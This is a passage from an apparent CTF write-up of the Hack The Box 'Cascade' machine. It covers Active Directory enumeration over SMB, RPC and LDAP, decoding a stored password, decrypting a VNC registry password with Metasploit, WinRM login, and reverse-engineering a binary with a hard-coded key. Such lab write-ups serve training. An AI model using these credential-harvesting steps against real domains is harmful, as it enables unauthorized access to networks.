<p>The full scan almost returns the same result, except it discovers a WinRM port (5985).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ nmap -p- -oA nmap/full-cascade cascade.htb

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
</code></pre></div><blockquote>
<p>I&rsquo;ve added <code>10.10.10.182 cascade.htb</code> to my <code>/etc/hosts</code></p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb--rpc-over-smb">TCP 445 - SMB / RPC over SMB</h3>
<p>Anonymous login is allowed on SMB port. I tried to list all the shares using <code>smbclient</code> but there was nothing there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ smbclient -N -L //10.10.10.182
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</code></pre></div><h4 id="enumeration-via-rpc">Enumeration via RPC</h4>
<p>Knowing anonymous login is allowed on SMB, I can try it too on RPC using <code>rpcclient</code> and it works as well.</p>
<p>With current access, I can obtain the domain users and their groups manually.</p>
<p>User enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.10.182
rpcclient $&gt;
rpcclient $&gt; enumdomusers
user:<span class="o">[</span>CascGuest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
user:<span class="o">[</span>arksvc<span class="o">]</span> rid:<span class="o">[</span>0x452<span class="o">]</span>
user:<span class="o">[</span>s.smith<span class="o">]</span> rid:<span class="o">[</span>0x453<span class="o">]</span>
user:<span class="o">[</span>r.thompson<span class="o">]</span> rid:<span class="o">[</span>0x455<span class="o">]</span>
user:<span class="o">[</span>util<span class="o">]</span> rid:<span class="o">[</span>0x457<span class="o">]</span>
user:<span class="o">[</span>j.wakefield<span class="o">]</span> rid:<span class="o">[</span>0x45c<span class="o">]</span>
user:<span class="o">[</span>s.hickson<span class="o">]</span> rid:<span class="o">[</span>0x461<span class="o">]</span>
user:<span class="o">[</span>j.goodhand<span class="o">]</span> rid:<span class="o">[</span>0x462<span class="o">]</span>
user:<span class="o">[</span>a.turnbull<span class="o">]</span> rid:<span class="o">[</span>0x464<span class="o">]</span>
user:<span class="o">[</span>e.crowe<span class="o">]</span> rid:<span class="o">[</span>0x467<span class="o">]</span>
user:<span class="o">[</span>b.hanson<span class="o">]</span> rid:<span class="o">[</span>0x468<span class="o">]</span>
user:<span class="o">[</span>d.burman<span class="o">]</span> rid:<span class="o">[</span>0x469<span class="o">]</span>
user:<span class="o">[</span>BackupSvc<span class="o">]</span> rid:<span class="o">[</span>0x46a<span class="o">]</span>
user:<span class="o">[</span>j.allen<span class="o">]</span> rid:<span class="o">[</span>0x46e<span class="o">]</span>
user:<span class="o">[</span>i.croft<span class="o">]</span> rid:<span class="o">[</span>0x46f<span class="o">]</span>
</code></pre></div><p>I&rsquo;ll save the output to a file called <code>users</code>, and filter the usernames only then pipe it to <code>users.list</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ cat users <span class="p">|</span> tr -d <span class="s1">&#39;[]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> cut -c6- <span class="p">|</span> tee users.list
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
</code></pre></div><p>Builtin group enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; enumalsgroups <span class="nb">builtin</span>
group:<span class="o">[</span>Pre-Windows <span class="m">2000</span> Compatible Access<span class="o">]</span> rid:<span class="o">[</span>0x22a<span class="o">]</span>
group:<span class="o">[</span>Incoming Forest Trust Builders<span class="o">]</span> rid:<span class="o">[</span>0x22d<span class="o">]</span>
group:<span class="o">[</span>Windows Authorization Access Group<span class="o">]</span> rid:<span class="o">[</span>0x230<span class="o">]</span>
group:<span class="o">[</span>Terminal Server License Servers<span class="o">]</span> rid:<span class="o">[</span>0x231<span class="o">]</span>
group:<span class="o">[</span>Users<span class="o">]</span> rid:<span class="o">[</span>0x221<span class="o">]</span>
group:<span class="o">[</span>Guests<span class="o">]</span> rid:<span class="o">[</span>0x222<span class="o">]</span>
group:<span class="o">[</span>Remote Desktop Users<span class="o">]</span> rid:<span class="o">[</span>0x22b<span class="o">]</span>
group:<span class="o">[</span>Network Configuration Operators<span class="o">]</span> rid:<span class="o">[</span>0x22c<span class="o">]</span>
group:<span class="o">[</span>Performance Monitor Users<span class="o">]</span> rid:<span class="o">[</span>0x22e<span class="o">]</span>
group:<span class="o">[</span>Performance Log Users<span class="o">]</span> rid:<span class="o">[</span>0x22f<span class="o">]</span>
group:<span class="o">[</span>Distributed COM Users<span class="o">]</span> rid:<span class="o">[</span>0x232<span class="o">]</span>
group:<span class="o">[</span>IIS_IUSRS<span class="o">]</span> rid:<span class="o">[</span>0x238<span class="o">]</span>
group:<span class="o">[</span>Cryptographic Operators<span class="o">]</span> rid:<span class="o">[</span>0x239<span class="o">]</span>
group:<span class="o">[</span>Event Log Readers<span class="o">]</span> rid:<span class="o">[</span>0x23d<span class="o">]</span>
group:<span class="o">[</span>Certificate Service DCOM Access<span class="o">]</span> rid:<span class="o">[</span>0x23e<span class="o">]</span>
</code></pre></div><p>Domain group enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; enumalsgroups domain
group:<span class="o">[</span>Cert Publishers<span class="o">]</span> rid:<span class="o">[</span>0x205<span class="o">]</span>
group:<span class="o">[</span>RAS and IAS Servers<span class="o">]</span> rid:<span class="o">[</span>0x229<span class="o">]</span>
group:<span class="o">[</span>Allowed RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23b<span class="o">]</span>
group:<span class="o">[</span>Denied RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23c<span class="o">]</span>
group:<span class="o">[</span>DnsAdmins<span class="o">]</span> rid:<span class="o">[</span>0x44e<span class="o">]</span>
group:<span class="o">[</span>IT<span class="o">]</span> rid:<span class="o">[</span>0x459<span class="o">]</span>
group:<span class="o">[</span>Production<span class="o">]</span> rid:<span class="o">[</span>0x45a<span class="o">]</span>
group:<span class="o">[</span>HR<span class="o">]</span> rid:<span class="o">[</span>0x45b<span class="o">]</span>
group:<span class="o">[</span>AD Recycle Bin<span class="o">]</span> rid:<span class="o">[</span>0x45f<span class="o">]</span>
group:<span class="o">[</span>Backup<span class="o">]</span> rid:<span class="o">[</span>0x460<span class="o">]</span>
group:<span class="o">[</span>Temps<span class="o">]</span> rid:<span class="o">[</span>0x463<span class="o">]</span>
group:<span class="o">[</span>WinRMRemoteWMIUsers__<span class="o">]</span> rid:<span class="o">[</span>0x465<span class="o">]</span>
group:<span class="o">[</span>Remote Management Users<span class="o">]</span> rid:<span class="o">[</span>0x466<span class="o">]</span>
group:<span class="o">[</span>Factory<span class="o">]</span> rid:<span class="o">[</span>0x46c<span class="o">]</span>
group:<span class="o">[</span>Finance<span class="o">]</span> rid:<span class="o">[</span>0x46d<span class="o">]</span>
group:<span class="o">[</span>Audit Share<span class="o">]</span> rid:<span class="o">[</span>0x471<span class="o">]</span>
group:<span class="o">[</span>Data Share<span class="o">]</span> rid:<span class="o">[</span>0x472<span class="o">]</span>
</code></pre></div><p>List group members:</p>
<p>Members of IT group (rid:0x459)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x459
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1109<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1109
S-1–5–21–3332504370–1206983947–1165150453–1109 CASCADE<span class="se">\r</span>.thompson <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Members of Remote Management Users group (rid:0x466)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x466
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Member of AD Recycle Bin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x45f
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Members of HR (rid:0x45b)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x45b
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1121<span class="o">]</span>
</code></pre></div><p>Members of Audit group (rid:0x471)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x471
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Members of Data share group (rid:0x472)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x472
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–513<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–513
S-1–5–21–3332504370–1206983947–1165150453–513 CASCADE<span class="se">\D</span>omain Users <span class="o">(</span>2<span class="o">)</span>
</code></pre></div><p>After enough digging, I did a password spray with a pattern of “username%username”, but no luck.</p>
<p>Before moving on, I&rsquo;ll note the Remote Management Users group members:</p>
<ul>
<li><code>arksvc</code></li>
<li><code>s.smith</code></li>
</ul>
<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>In LDAP, anonymous login are also allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ ldapsearch -h <span class="s1">&#39;10.10.10.182&#39;</span> -x -b <span class="s2">&#34;dc=cascade,dc=local&#34;</span> &gt; ldap-enum
</code></pre></div><blockquote>
<p>Nmap already identifies the Active Directory domain name as <code>cascade.local</code>. Because AD is basically based on the LDAP protocol, in LDAP form or known as a distinguished name, the AD domain usually follows &ldquo;DC=NAME,DC=TLD&rdquo;.</p>
<ul>
<li>cascade = NAME</li>
<li>local = TLD (Top-Level Domain)</li>
</ul>
</blockquote>
<p>While examining the output from <code>ldap-enum</code>, I spotted an interesting line from user Ryan Thompson.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;snip&gt;...
displayName: Ryan Thompson
uSNCreated: <span class="m">24610</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
uSNChanged: <span class="m">295010</span>
name: Ryan Thompson
...&lt;snip&gt;...
logonCount: <span class="m">2</span>
sAMAccountName: r.thompson
sAMAccountType: <span class="m">805306368</span>
userPrincipalName: r.thompson@cascade.local
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
...&lt;snip&gt;...
lastLogonTimestamp: <span class="m">132294360317419816</span>
msDS-SupportedEncryptionTypes: <span class="m">0</span>
cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>
</code></pre></div><p>The <code>cascadeLegacyPwd: clk0bjVldmE=</code> line only appears on Ryan Thompson section and it can be decoded into <code>rY4n5eva</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ <span class="nb">echo</span> <span class="nv">clk0bjVldmE</span><span class="o">=</span> <span class="p">|</span> base64 -d
rY4n5eva
</code></pre></div><p>I&rsquo;ll mark the accounts that have a <code>logonCount</code> value greater than one:</p>
<p><div class="img-container"><img src="imgs/image-20210423204454321.png" alt="image-20210423204454321"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210423204536286.png" alt="image-20210423204536286"  /></div>
</p>
<h3 id="access-as-rthompson">Access as r.thompson</h3>
<p>It turns out that the decoded <code>cascadeLegacyPwd</code> is <code>r.thompson </code>&rsquo;s password.</p>
<p>With <code>r.thompson</code> creds, I can see all the available shares.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ crackmapexec smb cascade.htb -u r.thompson -p <span class="s1">&#39;rY4n5eva&#39;</span> --shares 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423204947026.png" alt="image-20210423204947026"  /></div>
</p>
<h4 id="data-share">Data share</h4>
<p>In Data shares, <code>r.thompson</code> is only allowed to read IT folder. I&rsquo;ll pull all the files from the IT folder using <code>smbget</code>.</p>
<blockquote>
<p>Recall enumeration via RPC, <code>r.thompson</code> is a member of the IT group.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ smbget -R smb://cascade.htb/Data/IT/ -U r.thompson
</code></pre></div><p><img src="imgs/image-20210423205837847.png" alt="image-20210423205837847" style="zoom:80%;" /></p>
<p>Here is the directory structure. I&rsquo;ll take a look on <code>Meeting_Notes_June_2018.html</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ tree
.
└── IT
    ├── Email Archives
    │   └── Meeting_Notes_June_2018.html
    ├── LogonAudit
    ├── Logs
    │   ├── Ark AD Recycle Bin
    │   │   └── ArkAdRecycleBin.log
    │   └── DCs
    │       └── dcdiag.log
    └── Temp
        ├── r.thompson
        └── s.smith
            └── VNC Install.reg

<span class="m">9</span> directories, <span class="m">4</span> files
</code></pre></div><p>I can read the <code>Meeting_Notes_June_2018.html</code>&rsquo;s content using browser. I drew a red line to indicate something important.</p>
<p><div class="img-container"><img src="imgs/image-20210423210730678.png" alt="image-20210423210730678"  /></div>
</p>
<p>The second interesting file is <code>VNC Install.reg</code>. It contains a stored password which can be decrypted according to this GitHub (<a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">□□Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
...&lt;snip&gt;...
&#34;Password&#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f
...&lt;snip&gt;...
</code></pre></div><p>The third interesting file is <code>ArkAdRecycleBin.log</code>. It looks like a log from a custom application. I&rsquo;ll take note on &ldquo;Moving object to AD recycle bin CN=TempAdmin&rdquo; part.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</code></pre></div><p>As for <code>dcdiag.log</code>, up until now, I had no idea what that log was about.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-ssmith">Shell as s.smith</h3>
<h4 id="decrypt-vnc-password">Decrypt VNC Password</h4>
<p>The VNC password can be decrypted using metasploit irb (interactive ruby).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ msfconsole -q
msf6 &gt; irb
<span class="o">[</span>*<span class="o">]</span> Starting IRB shell...
<span class="o">[</span>*<span class="o">]</span> You are in the <span class="s2">&#34;framework&#34;</span> object

irb: warn: can<span class="s1">&#39;t alias jobs from irb_jobs.
</span><span class="s1">&gt;&gt; fixedkey = &#34;\x17\x52\x6b\x06\x23\x4e\x58\x07&#34;
</span><span class="s1">=&gt; &#34;\x17Rk\x06#NX\a&#34;
</span><span class="s1">&gt;&gt; require &#39;</span>rex/proto/rfb<span class="s1">&#39;
</span><span class="s1">=&gt; true
</span><span class="s1">&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&#34;6BCF2A4B6E5ACA0f&#34;].pack(&#39;</span>H*<span class="err">&#39;</span><span class="o">)</span>, <span class="nv">fixedkey</span>
<span class="o">=</span>&gt; <span class="s2">&#34;sT333ve2&#34;</span>
</code></pre></div><p>Since it was discovered in <code>s.smith</code>&rsquo;s folder, I will try this decrypted password on user <code>s.smith</code>.</p>
<h4 id="remote-access">Remote Access</h4>
<p>From RPC enumeration, I already knew that user <code>s.smith</code> is a member of Remote Management Users, so I could try it with <code>evil-winrm</code> and it works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ evil-winrm -i cascade.htb -u s.smith -p <span class="s1">&#39;sT333ve2&#39;</span>
</code></pre></div><p>I can grab user flag.</p>
<p><img src="imgs/image-20210423213702788.png" alt="image-20210423213702788" style="zoom:80%;" /></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-arksvc">Shell as arksvc</h3>
<h4 id="audit-share">Audit$ share</h4>
<p>After enumerating <code>s.smith</code>&rsquo;s privileges and groups, <code>CASCADE\Audit Share</code> reminds me to the <code>Audit$</code> share, to which I previously had no access.</p>
<p><div class="img-container"><img src="imgs/image-20210423214229455.png" alt="image-20210423214229455"  /></div>
</p>
<p>I have read permissions now on <code>Audit$</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210423214742159.png" alt="image-20210423214742159"  /></div>
</p>
<p>This share appears to contain an entire software application.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ smbclient -U s.smith <span class="se">\\\\</span>cascade.htb<span class="se">\\</span>Audit$
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423214817145.png" alt="image-20210423214817145"  /></div>
</p>
<p>I&rsquo;ll pull them all from Cascade to my Kali</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ smbget -R smb://cascade.htb/Audit$ -U s.smith
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423215007263.png" alt="image-20210423215007263"  /></div>
</p>
<p>And then send them over to my Windows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Audit$» «192.168.43.234»
$ tree
.
├── CascAudit.exe
├── CascCrypto.dll
├── DB
│   └── Audit.db
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll

<span class="m">3</span> directories, <span class="m">8</span> files

→ root@iamf «Audit$» «192.168.43.234»
$ file CascAudit.exe
CascAudit.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel <span class="m">80386</span> Mono/.Net assembly, <span class="k">for</span> MS Windows
</code></pre></div><h4 id="analyzing-auditdb">Analyzing Audit.db</h4>
<p><code>Audit.db</code> is an SQlite3 database. As I&rsquo;m analyzing on my Windows without SQLite installed, I&rsquo;ll use an online <a href="https://inloop.github.io/sqlite-viewer/">SQLite viewer</a>.</p>
<p>There are four tables in the database.</p>
<p><img src="imgs/image-20210423222130834.png" alt="image-20210423222130834" style="zoom:80%;" /></p>
<p>The records of the deleted AD object are kept in the <code>DeletedUserAudit</code> table.</p>
<p><img src="imgs/image-20210423221127995.png" alt="image-20210423221127995" style="zoom:80%;" /></p>
<p>The <code>Ldap</code> table contains the credentials for ArkSvc.</p>
<p><img src="imgs/image-20210423222309586.png" alt="image-20210423222309586" style="zoom:80%;" /></p>
<p>The password is not a simple base64 encoded string, but it is encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Audit$» «192.168.43.234»
$ <span class="nb">echo</span> <span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span> <span class="p">|</span> base64 -d
♣♥□□□□□□D□<span class="p">|</span>zC□♠<span class="p">;</span><span class="c1">#</span>
</code></pre></div><h4 id="analyzing-cascauditexe">Analyzing CascAudit.exe</h4>
<p>I tried to run the program on my PC, but it produced the following errors.</p>
<p><div class="img-container"><img src="imgs/image-20210423223821767.png" alt="image-20210423223821767"  /></div>
</p>
<blockquote>
<p>Don&rsquo;t run an untrusted binary you downloaded from a CTF box.</p>
</blockquote>
<p>I use a tool called <code>dnSpy</code> to reverse CascAudit.exe.</p>
<p>Once it is loaded, I&rsquo;ll go straight to the main function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
    
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
<span class="k">try</span>
			<span class="p">{</span>
				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
				<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteCommand</span> <span class="n">sqliteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SQLiteCommand</span><span class="p">(</span><span class="s">&#34;SELECT * FROM LDAP&#34;</span><span class="p">,</span> <span class="n">sqliteConnection</span><span class="p">))</span>
				<span class="p">{</span>
					<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteDataReader</span> <span class="n">sqliteDataReader</span> <span class="p">=</span> <span class="n">sqliteCommand</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">())</span>
					<span class="p">{</span>
						<span class="n">sqliteDataReader</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
						<span class="n">str</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Uname&#34;</span><span class="p">]);</span>
						<span class="n">str2</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Domain&#34;</span><span class="p">]);</span>
						<span class="kt">string</span> <span class="n">encryptedString</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Pwd&#34;</span><span class="p">]);</span>
						<span class="k">try</span>
						<span class="p">{</span>
							<span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
						<span class="p">}</span>
						<span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
						<span class="p">{</span>
							<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Error decrypting password: &#34;</span> <span class="p">+</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
							<span class="k">return</span><span class="p">;</span>
						<span class="p">}</span>
					<span class="p">}</span>
				<span class="p">}</span>
				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
			<span class="p">}</span>
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
</code></pre></div><p>In order for the program to run properly, I need to specify the database path as its first argument.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
</code></pre></div><p>If the condition above is satisfied, it opens an SQL connection and fetches all data from the <code>Ldap</code> table. Each of them is then stored into <code>str</code>, <code>str2</code>, and <code>password</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
				<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteCommand</span> <span class="n">sqliteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SQLiteCommand</span><span class="p">(</span><span class="s">&#34;SELECT * FROM LDAP&#34;</span><span class="p">,</span> <span class="n">sqliteConnection</span><span class="p">))</span>
				<span class="p">{</span>
